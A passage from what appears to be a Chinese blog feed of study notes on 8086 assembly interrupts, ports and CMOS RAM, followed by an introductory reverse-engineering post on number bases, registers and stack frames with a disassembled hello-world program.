中断</h2>\n<p>中断分为硬件中断和软件中断</p>\n<p>硬件中断分为外部中断和内部中断</p>\n<p>内部中断是不可屏蔽的中断</p>\n<p>外部中断时可屏蔽的中断</p>\n<p>中断向量表</p>\n<p>CPU 用八位类型码通过中断向量表找到中断程序的入口地址</p>\n<p>中断向量表可以裂解为一个索引</p>\n<p>其中存放着 256 个中断源所对应的中断处理 程序入口</p>\n<p>8086 中，中断向量表在 0000:0000 - 0000:03FF 1024 个字节</p>\n<p>中断过程</p>\n<p>1. 取得中断类型码 N</p>\n<p>2.pushf</p>\n<p>3.TF=0，IF=0</p>\n<p>4.push cs</p>\n<p>5.push ip</p>\n<p>6. <code>(IP) = (N*4) , (CS) = (N*4+2)</code>    N*x 指的是在中断向量表中找 CS 和 IP</p>\n<p>中断处理步骤</p>\n<p>1. 保存用到的寄存器</p>\n<p>2. 处理中断</p>\n<p>3. 恢复用到的寄存器</p>\n<p>4. 用 iret 指令返回</p>\n<p>iret – pop ip  pop cs  popf</p>\n<p>中断寄存器入栈标志，CS，IP。iret 正好和他相反</p>\n<p>除法溢出，产生中断类型为 0</p>\n<p>我们是可以改变中断后处理的过程的</p>\n<p>改变 0 号中断处理程序</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">assume cs:code</span><br><span class=\"line\"></span><br><span class=\"line\">code segment</span><br><span class=\"line\">start:\t</span><br><span class=\"line\">\t\tmov ax, cs</span><br><span class=\"line\">\t\tmov ds, ax</span><br><span class=\"line\">\t\tmov si, offset do0\t\t;设置ds:si指向源地址</span><br><span class=\"line\">\t\tmov ax, 0</span><br><span class=\"line\">\t\tmov es, ax</span><br><span class=\"line\">\t\tmov di, 200h\t\t\t;设置es:di指向目的地址</span><br><span class=\"line\">\t\tmov cx, offset do0end - offset do0\t\t;设置cx为传输长度</span><br><span class=\"line\">\t\tcld\t\t\t\t        ;设置传输方向为正</span><br><span class=\"line\">\t\trep movsb</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tmov ax, 0               ;设置中断向量表</span><br><span class=\"line\">\t\tmov es, ax</span><br><span class=\"line\">\t\tmov word ptr es:[0*4], 200h</span><br><span class=\"line\">\t\tmov word ptr es:[0*4+2], 0</span><br><span class=\"line\"></span><br><span class=\"line\">      \tmov ax,4c00h</span><br><span class=\"line\">      \tint 21h</span><br><span class=\"line\"></span><br><span class=\"line\">do0:\tjmp short do0start</span><br><span class=\"line\">      \tdb &quot;Welcome to Fishc.com!&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">do0start:</span><br><span class=\"line\">      \tmov ax, cs</span><br><span class=\"line\">      \tmov ds, ax</span><br><span class=\"line\">      \tmov si, 202h\t\t\t;设置ds:si指向字符串</span><br><span class=\"line\"></span><br><span class=\"line\">      \tmov ax, 0b800h</span><br><span class=\"line\">      \tmov es, ax</span><br><span class=\"line\">\t\tmov di, 12*160+36*2\t\t;设置es:di指向显存空间的中间位置</span><br><span class=\"line\"></span><br><span class=\"line\">        mov cx, 21\t\t\t\t;设置cx为字符串长度</span><br><span class=\"line\">\ts:\tmov al, [si]</span><br><span class=\"line\">      \tmov es:[di], al</span><br><span class=\"line\">      \tinc si</span><br><span class=\"line\">      \tadd di, 1</span><br><span class=\"line\">\t\tmov al, 02h             ;设置颜色</span><br><span class=\"line\">\t\tmov es:[di], al        </span><br><span class=\"line\">\t\tadd di, 1</span><br><span class=\"line\">      \tloop s</span><br><span class=\"line\"></span><br><span class=\"line\">      \tmov ax, 4c00h</span><br><span class=\"line\">      \tint 21h</span><br><span class=\"line\">do0end:\tnop</span><br><span class=\"line\"></span><br><span class=\"line\">code ends</span><br><span class=\"line\">end start</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>单步中断</p>\n<p>CPU 在执行完一条指令之后，如果检到标志寄存器的 TF 位为 1，则产生单步中断，引发中断过程。</p>\n<p>但不中断类型码为 1</p>\n<p>中断过程：</p>\n<p>取得中断类型码 1</p>\n<p>TF=0 ,IF=0</p>\n<p>CS,IP 入栈</p>\n<p><code>IP=(1*4)  CS=(1*4+2)</code></p>\n<p>TF=1, 执行程一条指令后执行单步中断</p>\n<p>使用 t 命令是，debug 将 tf=1，执行完一条指令引发单步中断，显示寄存器，等待输入</p>\n<p>也有情况，即使发生中断，也不响应</p>\n<p>设置完 ss 后，即使中断，cpu 也不响应，因为 ss:sp 需要连续完成，不然 sp 指向的不是正确的栈顶</p>\n<p>我们利用这个特性，将 ss 和 sp 的设置指令连续存放</p>\n<p>mov ax,1000h</p>\n<p>mov ss,ax</p>\n<p>mov sp,0</p>\n<p>mov ax,10</p>\n<p>如果 ax=10 放在 sp 和 ss 中间，该指令不会被执行</p>\n<h2 id=\"int\"><a class=\"markdownIt-Anchor\" href=\"#int\">#</a> int</h2>\n<p>int n  n 为中断类型码，引发中断过程</p>\n<p>1. 取得类型码 n</p>\n<p>2.IF=0,TF=0</p>\n<p>3.CS,IP 入栈</p>\n<p><code>4.IP=(n*4)  CS=(n*4+2)</code></p>\n<p>可以不做触发，通过 int 执行 0 号中断</p>\n<p>int 一般和 iret 指令配合使用</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">assume cs:code</span><br><span class=\"line\">code segment</span><br><span class=\"line\"></span><br><span class=\"line\">start:</span><br><span class=\"line\">\t\tmov ax,cs</span><br><span class=\"line\">\t\tmov ds,ax</span><br><span class=\"line\">\t\tmov si,offset capital</span><br><span class=\"line\">\t\tmov ax,0</span><br><span class=\"line\">\t\tmov es,ax</span><br><span class=\"line\">\t\tmov di,200h</span><br><span class=\"line\">\t\tmov cx,offset capitalend - offset capital</span><br><span class=\"line\">\t\tcld</span><br><span class=\"line\">\t\trep movsb</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tmov ax,0</span><br><span class=\"line\">\t\tmov es,ax</span><br><span class=\"line\">\t\tmov word ptr es:[7ch*4],200h</span><br><span class=\"line\">\t\tmov word ptr es:[7ch*4+2],0</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tmov ax,4c00h</span><br><span class=\"line\">\t\tint 21h</span><br><span class=\"line\"></span><br><span class=\"line\">capital:</span><br><span class=\"line\">\t\tpush cx</span><br><span class=\"line\">\t\tpush si</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">change: </span><br><span class=\"line\">\t\tmov cl,[si]</span><br><span class=\"line\">\t\tmov ch,0</span><br><span class=\"line\">\t\tjcxz ok</span><br><span class=\"line\">\t\tand byte ptr [si],11011111b</span><br><span class=\"line\">\t\tinc si</span><br><span class=\"line\">\t\tjmp short change</span><br><span class=\"line\">ok:\t</span><br><span class=\"line\">\t\tpop si</span><br><span class=\"line\">\t\tpop cx</span><br><span class=\"line\">\t\tiret</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">capitalend:nop</span><br><span class=\"line\"></span><br><span class=\"line\">code ends</span><br><span class=\"line\"></span><br><span class=\"line\">end start</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>int 10h 是 bios 中断例程</p>\n<p>BIOS 和 DOS 中断例程用 ah 来传递子程序的编号</p>\n<p><code>(ah)=2表示调用第10h号中断例程的 2号子程序，功能为设置光标位置，可以提供光标所在的行号（80*25字符模式下:0~24 ),列号（80*25字符模式下: 0~79)，和页号作为参数。(bh)=6 , (dh)=5, (d1)=12，设置光标到第0页，第5行，第12列。</code></p>\n<p>内存地址中 B8000-BFFFFh 共 32kb，为显示缓冲区</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">;编程：在屏幕的5行12列显示3个红底高亮闪烁绿色的‘a’。</span><br><span class=\"line\"></span><br><span class=\"line\">assume cs:code</span><br><span class=\"line\">code segment</span><br><span class=\"line\">\tmov ah,2 \t;置光标</span><br><span class=\"line\">\tmov bh,0\t;第0页</span><br><span class=\"line\">\tmov dh,5\t;dh中放行号</span><br><span class=\"line\">\tmov dl,12\t;dl中放列号</span><br><span class=\"line\">\tint 10h\t</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tmov ah,9\t;置光标</span><br><span class=\"line\">\tmov al,&#x27;a&#x27;\t;字符</span><br><span class=\"line\">\tmov bl,11001010b;颜色属性</span><br><span class=\"line\">\tmov bh,0\t;第0页</span><br><span class=\"line\">\tmov cx,3\t;字符重复个数</span><br><span class=\"line\">\tint 10h</span><br><span class=\"line\"></span><br><span class=\"line\">\tmov ax,4c00h</span><br><span class=\"line\">\tint 21h </span><br><span class=\"line\"></span><br><span class=\"line\">code ends</span><br><span class=\"line\">end</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>int 21H</p>\n<p>int 21h 中断例程是 DOS 提供的中断例程，其中包含了 DOS 提供给程序员在编程时调用为子程序</p>\n<p>我们从前一直使用的是 int 21 中断例程 4ch 号功能，即程序返回功能</p>\n<p>mov ah,4ch  ; 程序返回</p>\n<p>mov al,0        ; 返回值</p>\n<p>int 21h</p>\n<h2 id=\"端口\"><a class=\"markdownIt-Anchor\" href=\"#端口\">#</a> 端口</h2>\n<p>端口读写指令 in 和 out 分别用于读取和写入数据</p>\n<p>in al,60h</p>\n<p>从 60h 号端口读入一个字节</p>\n<p>在 in out 指令中，只能使用 ax 或 al 来存放从端口中读入的数据或要发送到端口中的数据</p>\n<p>in al,20h</p>\n<p>out 20h,al</p>\n<p>CMOS RAM</p>\n<p>包含一个时钟和一个有 128 位存储单元的 RAM 存储区</p>\n<p>128 个字节中，内部时钟占用 0-0dh，其余大部分单元用于保存系统配置信息</p>\n<p>BIOS 中有两个端口，为 70h 和 71h，通过这两个端口读取 CMOS RAM</p>\n<p>70h 为地址，存放 CMOS RAM 单元地址，71 为数据端口，存放选定的 CMOS RAM 读取的数据</p>\n<p>shl 和 shr</p>\n<p>逻辑移位指令</p>\n<p>shl 逻辑左移指令</p>\n<p>将一个数据向左移位，最后移除的移位写入 cf，最低位 0 补充，数据可以来自寄存器或内存单元</p>\n<p>移位位数大于 1 时，必须将移动位数放入 cl</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mov al,01010001b</span><br><span class=\"line\">mov cl,3</span><br><span class=\"line\">shl al,cl    ;从al拿出来在放回al去</span><br></pre></td></tr></table></figure>\n<p>shr</p>\n<p>和 shl 相反</p>\n<p>右移 = / 2</p>\n<p>CMOS RAM 中时间信息</p>\n<p>秒 00H</p>\n<p>分 02H</p>\n<p>时 04H</p>\n<p>日 07H</p>\n<p>月 08H</p>\n<p>年 09H</p>\n<p>他们都占一个字节，以 BCD 码存放</p>\n<h2 id=\"外中断\"><a class=\"markdownIt-Anchor\" href=\"#外中断\">#</a> 外中断</h2>\n<p>CPU 通过端口和外部设备进行联系</p>\n<p>外中断源有两类</p>\n<p>1. 可屏蔽中断</p>\n<p>2. 不可屏蔽中断</p>\n<p>IF=1 响应中断过程</p>\n<p>IF=0 不响应中断过程</p>\n<p>sti 设置 IF=1</p>\n<p>cli 设置 IF=0</p>\n<p>PC 机键盘处理过程</p>\n<p>引发 9 号中断</p>\n<p>— 般将按下一个键时产生的扫描码称为通码，松开一个键产生的扫描码称为断码</p>\n<p>断码 = 通码 + 80H</p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221108214017480.png\" alt=\"image-20221108214017480\" style=\"zoom:50%;\" />\n",
            "tags": [
                "汇编"
            ]
        },
        {
            "id": "http://example.com/2022/11/01/reverse/",
            "url": "http://example.com/2022/11/01/reverse/",
            "title": "逆向",
            "date_published": "2022-11-01T05:38:45.000Z",
            "content_html": "<h2 id=\"c与汇编的关系\"><a class=\"markdownIt-Anchor\" href=\"#c与汇编的关系\">#</a> C 与汇编的关系</h2>\n<h3 id=\"应用层技术栈\"><a class=\"markdownIt-Anchor\" href=\"#应用层技术栈\">#</a> 应用层技术栈：</h3>\n<ol>\n<li>加密与解密（四）看雪论坛</li>\n<li>X86/X64/arm 汇编语言</li>\n<li>windows 核心编程</li>\n<li>c 语言从入门到精通 (第三版) （清华）</li>\n</ol>\n<h3 id=\"学习逆向环境配置\"><a class=\"markdownIt-Anchor\" href=\"#学习逆向环境配置\">#</a> 学习逆向环境配置</h3>\n<p>工具类：</p>\n<ul>\n<li>吾爱破解工具类</li>\n<li>Hxd (十六进制编辑工具)</li>\n</ul>\n<p>开发类：</p>\n<ol>\n<li>VS2008 IDE</li>\n<li>VC6.0 SP6 IDE</li>\n</ol>\n<h3 id=\"进制转换\"><a class=\"markdownIt-Anchor\" href=\"#进制转换\">#</a> 进制转换</h3>\n<ol>\n<li>十进制的定义：由十个符号组成，分别是 0 1 2 3 4 5 6 7 8 9 逢十进一</li>\n<li>九进制的定义：由九个符号组成，分别是 0 1 2 3 4 5 6 7 8 逢九进一</li>\n<li>十六进制的定义：由十六个符号组成，分别是 0 1 2 3 4 5 6 7 8 9 A B C D E F</li>\n<li>N 进制的定义：由 N 个符号组成 逢 N 进一</li>\n</ol>\n<h3 id=\"数据类型与逻辑运算\"><a class=\"markdownIt-Anchor\" href=\"#数据类型与逻辑运算\">#</a> 数据类型与逻辑运算</h3>\n<p>在计算机中，由于硬件的制约，数据是有长度限制的，超过数据宽度的数据会被丢弃</p>\n<p>同一个数据，表示无符号数和有符号数则其含义不同</p>\n<ol>\n<li>无符号数：正数</li>\n<li>有符号数：正数、负数</li>\n</ol>\n<h3 id=\"常见的数据类型重要\"><a class=\"markdownIt-Anchor\" href=\"#常见的数据类型重要\">#</a> 常见的数据类型（重要）</h3>\n<ul>\n<li>BYTE                    字节          8BIT</li>\n<li>WORD                 字             16BIT 2 字节</li>\n<li>DWORD              双字          32BIT 4 字节</li>\n</ul>\n<h3 id=\"常见的运算符类型重要\"><a class=\"markdownIt-Anchor\" href=\"#常见的运算符类型重要\">#</a> <strong>常见的运算符类型（重要）</strong></h3>\n<p><strong>或运算（or |）</strong></p>\n<p>只要有一个为 1 则结果为 1</p>\n<p><strong>与运算（and &amp;）</strong></p>\n<p>两个都是 1 结果才为 1</p>\n<p><strong>异或运算（xor ^）</strong></p>\n<p>相同为 0 不同为 1</p>\n<p><strong>非运算 (not !)</strong></p>\n<p>取反 1 是 0 0 是 1</p>\n<h3 id=\"32位寄存器\"><a class=\"markdownIt-Anchor\" href=\"#32位寄存器\">#</a> 32 位寄存器</h3>\n<p>EAX</p>\n<p>EBX</p>\n<p>ECX</p>\n<p>EDX</p>\n<p>只有通用寄存器能拆成高位和低位</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mov byte [local.3+2],ah     //由于只是高位地址，因此是3+2</span><br><span class=\"line\">mov byte [local.3+3],ah     //同时注意是byte，所以是2</span><br></pre></td></tr></table></figure>\n<p>command 中</p>\n<p>?al 可以显示 al 中的值，即查看寄存器中的值</p>\n<p>dd  内存 display dword</p>\n<p>dw 内存</p>\n<p>db 内存</p>\n<h3 id=\"cpu计算23\"><a class=\"markdownIt-Anchor\" href=\"#cpu计算23\">#</a> CPU 计算 2+3</h3>\n<p>1. 先异或，得到 R</p>\n<p>2. 在与运算，将结果左移一位</p>\n<p>3. 如果 (2) 的结果为全 0，那么 R 就是最终答案，如果不是，将 R 赋值给 x，将 (2) 的结果赋值给 y</p>\n<p>4. 重复操作直至 (2) 的结果为全 0，那么此时 R 就是我们的答案</p>\n<h3 id=\"cpu计算2-3\"><a class=\"markdownIt-Anchor\" href=\"#cpu计算2-3\">#</a> CPU 计算 2-3</h3>\n<p>1. 异或，得到 R</p>\n<p>2. 在与运算，将结果再左移一位</p>\n<p>3. 如果结果为全 0，那么 R 就是结果，否则重复</p>\n<p>在 debug 的模式下是用常量来分配的 print hello world</p>\n<h3 id=\"堆栈的原理\"><a class=\"markdownIt-Anchor\" href=\"#堆栈的原理\">#</a> 堆栈的原理：</h3>\n<ol>\n<li>临时存放一些寄存器已无法存放的数据，比如超过内存对齐的数据类型</li>\n<li>存放临时数据，野指针，指针初始化时的数据</li>\n</ol>\n<p>Windows 分配栈时 是从高地址往低地址分配:</p>\n<ol>\n<li>MOV EBX,0x13FFDC        BASE</li>\n<li>MOV EDX,0x13FFDC        TOP</li>\n</ol>\n<p>EBP 和 ESP：</p>\n<p>ESP：该指针永远指向系统栈最上面一个栈帧的栈顶。</p>\n<p>EBP：该指针永远指向系统栈最上面一个栈帧的底部。</p>\n<p>栈底和栈顶原理：</p>\n<ol>\n<li>控制栈顶和栈底分别为两个固定的寄存器 (EBP 基址指针寄存器 和 ESP 堆栈指针寄存器）</li>\n</ol>\n<p>ebp = esp</p>\n<p>esp -= 0x40</p>\n<p><img data-src=\"https://cdn.nlark.com/yuque/0/2022/png/2759285/1654236227177-d37c824f-e09f-4e3d-9a41-c4d81ee6de30.png\" alt=\"img\"></p>\n<p>ESP 和 EBP 不够的时候会相互借用，两个都用作传参</p>\n<p>初始状态下，ebp 指向高地址，ESP 指向低地址</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221105095016154.png\" alt=\"image-20221105095016154\"></p>\n<p>push eax</p>\n<blockquote>\n<p>先把 esp-4，再把 eax 中的值压栈</p>\n</blockquote>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221105095049237.png\" alt=\"image-20221105095049237\"></p>\n<p>pop eax</p>\n<blockquote>\n<p>将 esp 指向的值给 eax，esp+4</p>\n</blockquote>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221105095144317.png\" alt=\"image-20221105095144317\"></p>\n<h4 id=\"一个helloworld的main函数\"><a class=\"markdownIt-Anchor\" href=\"#一个helloworld的main函数\">#</a> 一个 helloworld 的 main 函数</h4>\n<p>一般来说，VC 6.0 的 main 函数在  <code>call 00401005</code></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221105093859109.png\" alt=\"image-20221105093859109\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00401005  /$ /E9 06000000   jmp     main</span><br><span class=\"line\">0040100A  |  |CC            int3</span><br><span class=\"line\">0040100B  |  |CC            int3</span><br><span class=\"line\">0040100C  |  |CC            int3</span><br><span class=\"line\">0040100D  |  |CC            int3</span><br><span class=\"line\">0040100E  |  |CC            int3</span><br><span class=\"line\">0040100F  |  |CC            int3</span><br><span class=\"line\">00401010 &gt;|&gt; \\55            push    ebp</span><br><span class=\"line\">00401011  |.  8BEC          mov     ebp,esp</span><br><span class=\"line\">00401013  |.  83EC 40       sub     esp,0x40</span><br><span class=\"line\">00401016  |.  53            push    ebx</span><br><span class=\"line\">00401017  |.  56            push    esi</span><br><span class=\"line\">00401018  |.  57            push    edi</span><br><span class=\"line\">00401019  |.  8D7D C0       lea     edi,[local.16]</span><br><span class=\"line\">0040101C  |.  B9 10000000   mov     ecx,0x10</span><br><span class=\"line\">00401021  |.  B8 CCCCCCCC   mov     eax,0xCCCCCCCC</span><br><span class=\"line\">00401026  |.  F3:AB         rep     stos dword ptr es:[edi]</span><br><span class=\"line\">00401028  |.  68 1C204200   push    0042201C                         ; /format = &quot;Hello World!</span><br><span class=\"line\">&quot;</span><br><span class=\"line\">0040102D  |.  E8 2E000000   call    printf                           ; \\printf</span><br><span class=\"line\">00401032  |.  83C4 04       add     esp,0x4</span><br><span class=\"line\">00401035  |.  33C0          xor     eax,eax</span><br><span class=\"line\">00401037  |.  5F            pop     edi</span><br><span class=\"line\">00401038  |.  5E            pop     esi</span><br><span class=\"line\">00401039  |.  5B            pop     ebx</span><br><span class=\"line\">0040103A  |.  83C4 40       add     esp,0x40</span><br><span class=\"line\">0040103D  |.  3BEC          cmp     ebp,esp</span><br><span class=\"line\">0040103F  |.  E8 9C000000   call    _chkesp</span><br><span class=\"line\">00401044  |.  8BE5          mov     esp,ebp</span><br><span class=\"line\">00401046  |.  5D            pop     ebp</span><br><span class=\"line\">00401047  \\.  C3            retn</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>假设当前我们有这样一个程序</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// add_main.cpp : Defines the entry point for the console application.</span></span><br><span class=\"line\"><span class=\"comment\">//</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;stdafx.h&quot;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">func</span><span class=\"params\">(<span class=\"type\">int</span> m, <span class=\"type\">int</span> n)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> a, b;</span><br><span class=\"line\">    a = m;</span><br><span class=\"line\">    b = n;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span>* argv[])</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> m=<span class=\"number\">3</span>,n=<span class=\"number\">4</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">func</span>(m,n);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Hello World!\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>在调用 func 之前，main 的栈帧：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221105100143457.png\" alt=\"image-20221105100143457\"></p>\n<p>从低地址 esp 到高地址 ebp 的这块区域，就是当前 main 函数的栈帧。当 main 中调用 func 时，写成汇编大致是：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">push m</span><br><span class=\"line\">push n; 两个参数压入栈</span><br><span class=\"line\">call func; 调用func，将返回地址填入栈，并跳转到func</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00401078  |.  C745 FC 03000&gt;mov     dword ptr ss:[ebp-0x4],0x3</span><br><span class=\"line\">0040107F  |.  C745 F8 04000&gt;mov     dword ptr ss:[ebp-0x8],0x4</span><br><span class=\"line\">00401086  |.  8B45 F8       mov     eax,dword ptr ss:[ebp-0x8]</span><br><span class=\"line\">00401089  |.  50            push    eax</span><br><span class=\"line\">0040108A  |.  8B4D FC       mov     ecx,dword ptr ss:[ebp-0x4]</span><br><span class=\"line\">0040108D  |.  51            push    ecx</span><br><span class=\"line\">0040108E  |.  E8 72FFFFFF   call    00401005</span><br><span class=\"line\">00401093  |.  83C4 08       add     esp,0x8</span><br><span class=\"line\">00401096  |.  68 1C204200   push    0042201C                         ; /format = &quot;Hello World!</span><br><span class=\"line\">&quot;</span><br><span class=\"line\">0040109B  |.  E8 30000000   call    printf                           ; \\printf</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221105100732747.png\" alt=\"image-20221105100732747\"></p>\n<p>当跳转到了 func，来看看 func 的汇编大致的样子：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00401020 &gt;/&gt; \\55            push    ebp</span><br><span class=\"line\">00401021  |.  8BEC          mov     ebp,esp</span><br><span class=\"line\">00401023  |.  83EC 48       sub     esp,0x48</span><br><span class=\"line\">00401026  |.  53            push    ebx</span><br><span class=\"line\">00401027  |.  56            push    esi</span><br><span class=\"line\">00401028  |.  57            push    edi</span><br></pre></td></tr></table></figure>\n<p>push ebp 需要保存 main 